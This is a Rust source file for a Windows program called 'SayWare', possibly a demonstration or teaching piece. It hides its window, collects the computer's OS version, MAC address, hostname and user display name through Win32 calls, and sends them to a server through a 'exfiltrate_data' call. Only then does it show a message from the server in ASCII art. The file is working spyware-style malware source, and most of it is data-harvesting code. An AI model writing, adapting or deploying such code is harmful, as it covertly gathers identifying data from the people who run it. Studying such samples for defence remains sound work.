// SPDX-FileCopyrightText: 2025 The SayWare development team
//
// SPDX-License-Identifier: GPL-3.0-or-later

#![windows_subsystem = "windows"]

use crate::server::Client;
use cfonts::{Fonts, Options};
use sayware_types::ExfiltratedData;
use std::{hint, ptr};
use windows::{
    Wdk::System::SystemServices,
    Win32::{
        Foundation::ERROR_SUCCESS,
        NetworkManagement::{
            IpHelper::{
                self, GAA_FLAG_SKIP_ANYCAST, GAA_FLAG_SKIP_DNS_SERVER, GAA_FLAG_SKIP_FRIENDLY_NAME,
                GAA_FLAG_SKIP_MULTICAST, GAA_FLAG_SKIP_UNICAST, IP_ADAPTER_ADDRESSES_LH,
            },
            NetManagement::UNLEN,
        },
        Networking::WinSock::AF_INET,
        Security::Authentication::Identity::{self, NameDisplay},
        System::{
            Console, SystemInformation,
            SystemInformation::{ComputerNameNetBIOS, OSVERSIONINFOEXW},
            WindowsProgramming::MAX_COMPUTERNAME_LENGTH,
        },
    },
    core::PWSTR,
};

include!(concat!(env!("OUT_DIR"), "/configuration.rs"));

mod server;

#[tokio::main]
async fn main() {
    hint::black_box(SEED);

    let Ok(client) = Client::new() else {
        return;
    };

    client.exfiltrate_data(get_data_to_exfiltrate()).await;

    // SAFETY: AllocConsole fails gracefully if console already exists.
    if unsafe { Console::AllocConsole() }.is_err() {
        return;
    }

    println!(
        "{}",
        cfonts::render(Options {
            text: client.get_sentence().await,
            font: Fonts::FontTiny,
            ..Options::default()
        })
        .text
    );

    let mut input = String::new();
    let _ = std::io::stdin().read_line(&mut input);
}

fn get_data_to_exfiltrate() -> ExfiltratedData {
    ExfiltratedData {
        operating_system_version: get_operating_system_version(),
        mac_address: get_mac_address(),
        hostname: get_hostname(),
        username: get_username(),
    }
}

fn get_operating_system_version() -> String {
    let mut operating_system_informations = OSVERSIONINFOEXW::default();

    // SAFETY: Valid mutable pointer to initialized OSVERSIONINFOEXW structure.
    unsafe {
        let _ =
            SystemServices::RtlGetVersion(&mut operating_system_informations as *mut _ as *mut _);
    }

    format!(
        "Windows {}.{} {}",
        operating_system_informations.dwMajorVersion,
        operating_system_informations.dwMinorVersion,
        operating_system_informations.dwBuildNumber
    )
}

fn get_mac_address() -> Option<String> {
    let mut required_size = 0;

    // SAFETY: Query buffer size with null pointer.
    unsafe {
        IpHelper::GetAdaptersAddresses(
            AF_INET.0.into(),
            GAA_FLAG_SKIP_UNICAST
                | GAA_FLAG_SKIP_ANYCAST
                | GAA_FLAG_SKIP_FRIENDLY_NAME
                | GAA_FLAG_SKIP_MULTICAST
                | GAA_FLAG_SKIP_DNS_SERVER,
            None,
            None,
            &mut required_size,
        )
    };

    let mut addresses = vec![0u8; required_size as usize];

    // SAFETY: Buffer sized from previous call.
    if unsafe {
        IpHelper::GetAdaptersAddresses(
            AF_INET.0.into(),
            GAA_FLAG_SKIP_UNICAST
                | GAA_FLAG_SKIP_ANYCAST
                | GAA_FLAG_SKIP_FRIENDLY_NAME
                | GAA_FLAG_SKIP_MULTICAST
                | GAA_FLAG_SKIP_DNS_SERVER,
            None,
            Some(addresses.as_mut_ptr() as *mut _),
            ptr::null_mut(),
        )
    } != ERROR_SUCCESS.0
    {
        return None;
    }

    // SAFETY: Buffer populated by API, properly aligned.
    let adapter_address = unsafe { *(addresses.as_ptr() as *const IP_ADAPTER_ADDRESSES_LH) };

    Some(
        adapter_address.PhysicalAddress[..adapter_address.PhysicalAddressLength as usize]
            .iter()
            .map(|byte| format!("{byte:02X}"))
            .collect::<Vec<_>>()
            .join(":"),
    )
}

fn get_hostname() -> Option<String> {
    let mut hostname_buffer = [0u16; (MAX_COMPUTERNAME_LENGTH + 1) as usize];
    let mut hostname_length = MAX_COMPUTERNAME_LENGTH + 1;

    // SAFETY: Buffer sized per MAX_COMPUTERNAME_LENGTH.
    if unsafe {
        SystemInformation::GetComputerNameExW(
            ComputerNameNetBIOS,
            Some(PWSTR::from_raw(hostname_buffer.as_mut_ptr())),
            &mut hostname_length,
        )
    }
    .is_err()
    {
        return None;
    }

    Some(String::from_utf16_lossy(
        &hostname_buffer[..hostname_length as usize],
    ))
}

fn get_username() -> Option<String> {
    let mut username_buffer = [0u16; (UNLEN + 1) as usize];
    let mut username_length = UNLEN + 1;

    // SAFETY: Buffer sized per UNLEN.
    if !unsafe {
        Identity::GetUserNameExW(
            NameDisplay,
            Some(PWSTR::from_raw(username_buffer.as_mut_ptr())),
            &mut username_length,
        )
    } {
        return None;
    }

    Some(String::from_utf16_lossy(
        &username_buffer[..username_length as usize],
    ))
}
